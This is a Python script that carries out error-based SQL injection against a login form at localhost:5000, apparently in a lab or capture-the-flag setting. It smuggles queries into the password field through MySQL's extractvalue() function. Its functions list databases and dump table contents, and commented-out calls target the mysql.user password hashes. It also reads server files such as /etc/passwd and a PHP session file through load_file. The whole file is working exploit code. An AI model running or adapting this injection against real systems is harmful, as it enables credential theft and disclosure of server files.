import logging
import requests
import re
from ipdb import set_trace
#DEBUG = False
DEBUG = True

if DEBUG:
    logging.basicConfig(level=logging.DEBUG)
else:
    logging.basicConfig(level=logging.INFO)

logging.getLogger("urllib3").setLevel(logging.INFO)
s = requests.session()


def get_databases():
    query = "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA limit %d,1"
    for i in range(0,100):
        response = xpath(query % i)
        try:
            pretty = re.findall(r'A9U.*', response)[0].strip()[3:-3]
        except IndexError:
            break
        logging.info(pretty)
        if response == "":
            break


def load_file(filename):
    content = ""
    for i in range(0,1000):
        offset = i*28
        query = "SELECT substring((SELECT load_file('%s')), %d, %d) " % (filename, offset+1, (offset+28))
        response = xpath(query)
        try:
            pretty = re.findall(r'A9U.*', response)[0].strip()[3:-3]
        except IndexError:
            return content
        content += pretty
        if pretty == "":
            content = content.replace(r'\n', '\n')
            return content

def get_data(db, table, *columns):
    """ xpath limits: 
        - only on column and one row is allowed
        - length is limited to ~32 chars
    """
    rows = []
    for i in range(0,100):
        row = []
        for column in columns:
            query = "SELECT %s FROM %s.%s limit %d,1" % (column, db, table, i)
            response = xpath(query)
            try:
                pretty = re.findall(r'A9U.*', response)[0].strip()[3:-3]
            except IndexError:
                return rows
            row.append(pretty)
            if response == "":
                return rows
        rows.append(row)
    return rows


def xpath(payload):
    # checks statement and returns True or False
    payload_xpath = "nonexisting' and extractvalue(0x0a,concat(0x0a413955,(%s)))-- -" % payload #0x... is only used for grepping later
    #logging.debug("payload: %s" % payload_xpath)
    data = { 'verbose': '1', 'user':'admin' , 'pass':'%s'% payload_xpath }
    response = s.get("http://localhost:5000/login", params=data).text
    #logging.debug(response)
    return response


if __name__ == '__main__':
    print(xpath("select database()")) # this is non-pretty
    #get_databases()
    #print(get_data("mysql", "user", "host", "user", "password"))
    #print(load_file("/etc/passwd"))
    #print(load_file("/var/www/html/session.php"))
